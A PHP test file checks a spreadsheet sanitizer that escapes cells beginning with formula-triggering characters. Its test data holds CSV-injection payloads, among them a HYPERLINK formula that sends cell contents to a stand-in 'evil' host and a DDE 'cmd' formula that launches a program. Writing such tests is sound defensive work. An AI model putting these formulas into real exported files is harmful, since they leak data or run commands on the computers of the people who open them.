<?php

declare(strict_types=1);

use App\Support\SpreadsheetSanitizer;

test('prefixes values that start with a formula-triggering character', function (string $value) {
    expect(SpreadsheetSanitizer::sanitizeCell($value))->toBe("'" . $value);
})->with([
    '=HYPERLINK("http://evil/steal?"&A1,"clique")',
    '+1+1',
    '-1+1',
    '@SUM(1+1)',
    "\ttab-prefixed",
    "\rcarriage-return-prefixed",
]);

test('leaves ordinary values untouched', function (mixed $value) {
    expect(SpreadsheetSanitizer::sanitizeCell($value))->toBe($value);
})->with([
    'Maria da Silva',
    'nome-com-hifen',
    '', // string vazia
    123,
    null,
    true,
]);

test('sanitizeRows applies the same rule to every cell of every row', function () {
    $rows = [
        ['ID', 'Nome', 'Instituição'],
        [1, '=cmd|" /C calc"!A1', 'Escola Normal'],
        [2, 'Aluno Normal', '+HYPERLINK("http://evil")'],
    ];

    expect(SpreadsheetSanitizer::sanitizeRows($rows))->toBe([
        ['ID', 'Nome', 'Instituição'],
        [1, "'=cmd|\" /C calc\"!A1", 'Escola Normal'],
        [2, 'Aluno Normal', "'+HYPERLINK(\"http://evil\")"],
    ]);
});
